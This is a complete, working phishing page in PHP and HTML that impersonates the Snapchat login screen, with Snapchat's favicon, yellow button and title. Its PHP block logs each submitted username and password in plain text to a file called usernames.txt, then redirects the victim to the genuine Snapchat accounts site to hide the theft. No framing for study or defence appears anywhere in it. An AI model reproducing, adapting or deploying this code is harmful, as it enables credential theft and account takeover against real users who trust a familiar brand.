<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://accounts.snapchat.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Snapchat – Log In</title><meta charset="UTF-8"></head>
<body style="background: #fff; font-family: Helvetica, Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="width: 350px; margin: auto; padding: 20px;">
<img src="https://www.snapchat.com/favicon.ico" width="60"><br>
<h2>Log In to Snapchat</h2>
<form method="post">
<input type="text" name="username" placeholder="Username or email" style="width: 90%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px;" required><br>
<button type="submit" style="background: #fffc00; color: #000; width: 95%; padding: 12px; border: none; border-radius: 30px; font-weight: bold;">Log In</button>
</form>
</div>
</body>
</html>
